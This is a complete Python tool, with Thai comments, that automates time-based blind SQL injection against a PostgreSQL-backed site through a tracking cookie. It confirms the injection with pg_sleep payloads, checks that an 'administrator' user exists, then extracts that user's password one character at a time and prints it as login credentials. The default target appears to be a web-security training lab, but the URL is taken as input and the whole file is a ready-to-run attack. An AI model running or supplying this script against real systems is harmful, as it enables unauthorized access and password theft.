#!/usr/bin/env python3
"""
Time-based Blind SQL Injection Automation Script
สำหรับ PostgreSQL database โดยใช้ pg_sleep() function
"""

import requests
import time
import string
import threading
from urllib.parse import quote

class TimedBlindSQLi:
    def __init__(self, target_url, cookie_name="TrackingId", delay=5):
        self.target_url = target_url
        self.cookie_name = cookie_name
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Character set สำหรับ brute force
        self.charset = string.ascii_lowercase + string.digits
        
        print(f"[+] Target: {target_url}")
        print(f"[+] Cookie: {cookie_name}")
        print(f"[+] Delay: {delay} seconds")
        print(f"[+] Character set: {self.charset}")
        print("-" * 60)

    def send_payload(self, payload):
        """ส่ง payload และวัดเวลาการตอบสนอง"""
        try:
            # URL encode payload
            encoded_payload = quote(payload, safe='')
            
            cookies = {self.cookie_name: encoded_payload}
            
            start_time = time.time()
            response = self.session.get(self.target_url, cookies=cookies, timeout=30)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            print(f"[DEBUG] Payload: {payload[:50]}...")
            print(f"[DEBUG] Response time: {response_time:.2f}s")
            
            return response_time >= self.delay - 1  # อนุญาต tolerance 1 วินาที
            
        except requests.exceptions.Timeout:
            print(f"[+] Request timeout - condition is TRUE")
            return True
        except Exception as e:
            print(f"[!] Error: {e}")
            return False

    def test_basic_injection(self):
        """ทดสอบ SQL injection เบื้องต้น"""
        print("[*] Testing basic SQL injection...")
        
        # ทดสอบเงื่อนไขที่เป็นจริง
        true_payload = f"x';SELECT CASE WHEN (1=1) THEN pg_sleep({self.delay}) ELSE pg_sleep(0) END--"
        print("[*] Testing TRUE condition (1=1)...")
        if self.send_payload(true_payload):
            print("[+] TRUE condition confirmed - SQL injection possible!")
        else:
            print("[-] TRUE condition failed")
            return False
        
        # ทดสอบเงื่อนไขที่เป็นเท็จ
        false_payload = f"x';SELECT CASE WHEN (1=2) THEN pg_sleep({self.delay}) ELSE pg_sleep(0) END--"
        print("[*] Testing FALSE condition (1=2)...")
        if not self.send_payload(false_payload):
            print("[+] FALSE condition confirmed - Time-based injection working!")
            return True
        else:
            print("[-] FALSE condition failed")
            return False

    def check_user_exists(self, username):
        """ตรวจสอบว่ามี username นี้หรือไม่"""
        print(f"[*] Checking if user '{username}' exists...")
        payload = f"x';SELECT CASE WHEN (username='{username}') THEN pg_sleep({self.delay}) ELSE pg_sleep(0) END FROM users--"
        
        if self.send_payload(payload):
            print(f"[+] User '{username}' exists!")
            return True
        else:
            print(f"[-] User '{username}' not found")
            return False

    def get_password_length(self, username, max_length=50):
        """หาความยาวของ password"""
        print(f"[*] Finding password length for user '{username}'...")
        
        length = 0
        for i in range(1, max_length + 1):
            payload = f"x';SELECT CASE WHEN (username='{username}' AND LENGTH(password)>{i}) THEN pg_sleep({self.delay}) ELSE pg_sleep(0) END FROM users--"
            
            print(f"[*] Testing length > {i}...")
            if self.send_payload(payload):
                length = i + 1
            else:
                print(f"[+] Password length found: {i}")
                return i
        
        print(f"[!] Password longer than {max_length} characters")
        return max_length

    def extract_password_char(self, username, position):
        """หาตัวอักษรในตำแหน่งที่กำหนด"""
        print(f"[*] Finding character at position {position}...")
        
        for char in self.charset:
            payload = f"x';SELECT CASE WHEN (username='{username}' AND SUBSTRING(password,{position},1)='{char}') THEN pg_sleep({self.delay}) ELSE pg_sleep(0) END FROM users--"
            
            print(f"[*] Testing character '{char}'...")
            if self.send_payload(payload):
                print(f"[+] Character at position {position}: '{char}'")
                return char
        
        print(f"[-] Character at position {position} not found in charset")
        return None

    def extract_password(self, username):
        """ดึง password ทั้งหมด"""
        print(f"[*] Extracting password for user '{username}'...")
        
        # หาความยาวของ password
        password_length = self.get_password_length(username)
        if not password_length:
            return None
        
        print(f"[+] Password length: {password_length}")
        
        # ดึงตัวอักษรทีละตัว
        password = ""
        for i in range(1, password_length + 1):
            char = self.extract_password_char(username, i)
            if char:
                password += char
                print(f"[+] Current password: {password}")
            else:
                print(f"[-] Failed to extract character at position {i}")
                break
        
        return password

    def full_attack(self, username="administrator"):
        """ทำการโจมตีแบบครบวงจร"""
        print("=" * 60)
        print("🚀 STARTING TIME-BASED BLIND SQL INJECTION ATTACK")
        print("=" * 60)
        
        # 1. ทดสอบ SQL injection
        if not self.test_basic_injection():
            print("[!] Basic SQL injection test failed!")
            return None
        
        print("\n" + "=" * 40)
        
        # 2. ตรวจสอบ user
        if not self.check_user_exists(username):
            print(f"[!] User '{username}' not found!")
            return None
        
        print("\n" + "=" * 40)
        
        # 3. ดึง password
        password = self.extract_password(username)
        
        if password:
            print("\n" + "🎉" * 20)
            print(f"[SUCCESS] Username: {username}")
            print(f"[SUCCESS] Password: {password}")
            print("🎉" * 20)
            return {"username": username, "password": password}
        else:
            print("\n[!] Failed to extract password")
            return None


def main():
    """ฟังก์ชันหลัก"""
    print("Time-based Blind SQL Injection Automation Tool")
    print("กรุณากรอกข้อมูลเป้าหมาย:")
    
    # รับ input จากผู้ใช้
    target_url = input("Target URL (เช่น https://example.com/): ").strip()
    if not target_url:
        target_url = "https://0a6f00d003c4dd5d80c31ff7008a00e8.web-security-academy.net/"
    
    cookie_name = input("Cookie name [TrackingId]: ").strip()
    if not cookie_name:
        cookie_name = "TrackingId"
    
    delay_input = input("Delay time in seconds [5]: ").strip()
    delay = int(delay_input) if delay_input.isdigit() else 5
    
    username = input("Target username [administrator]: ").strip()
    if not username:
        username = "administrator"
    
    print("\n" + "=" * 60)
    
    # สร้าง instance และเริ่มโจมตี
    sqli = TimedBlindSQLi(target_url, cookie_name, delay)
    result = sqli.full_attack(username)
    
    if result:
        print(f"\n[INFO] คุณสามารถเข้าสู่ระบบได้ด้วย:")
        print(f"Username: {result['username']}")
        print(f"Password: {result['password']}")
    else:
        print(f"\n[FAILED] การโจมตีไม่สำเร็จ")


if __name__ == "__main__":
    main()